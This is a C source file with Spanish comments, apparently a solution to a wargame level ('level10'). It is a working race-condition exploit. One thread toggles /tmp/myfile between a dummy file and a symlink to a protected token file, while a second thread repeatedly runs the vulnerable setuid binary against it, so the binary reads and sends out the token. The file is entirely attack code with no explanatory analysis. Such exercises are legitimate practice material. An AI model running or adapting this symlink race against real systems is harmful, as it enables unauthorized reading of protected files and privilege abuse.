#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>

#define TMP_FILE "/tmp/myfile"
#define REAL_FILE "/home/user/level10/token"

void *toggle_symlink(void *arg) {
    while (1) {
        // 1. Crear un archivo normal con contenido dummy
        int fd = open(TMP_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd != -1) {
            write(fd, "hello\n", 6);
            close(fd);
        }

        // 2. Eliminarlo
        unlink(TMP_FILE);

        // 3. Crear symlink apuntando al token
        symlink(REAL_FILE, TMP_FILE);

        // 4. Esperar un poco para que el binario lo lea si tiene suerte
        usleep(5000); // 5ms

        // 5. Eliminar el symlink para poder volver a crear archivo en el próximo ciclo
        unlink(TMP_FILE);
    }
    return NULL;
}

void *exploit_loop(void *arg) {
    while (1) {
        pid_t pid = fork();
        if (pid == 0) {
            // Hijo: ejecuta el binario vulnerable
            execl("/home/user/level10/level10", "level10", TMP_FILE, "127.0.0.1", NULL);
            perror("execl");
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            // Padre espera al hijo para evitar zombis
            waitpid(pid, NULL, 0);
        } else {
            perror("fork");
        }
    }
    return NULL;
}

int main() {
    pthread_t t1, t2;

    // Lanzar ambos hilos
    if (pthread_create(&t1, NULL, toggle_symlink, NULL) != 0) {
        perror("pthread_create toggle");
        return 1;
    }
    if (pthread_create(&t2, NULL, exploit_loop, NULL) != 0) {
        perror("pthread_create exploit");
        return 1;
    }

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    return 0;
}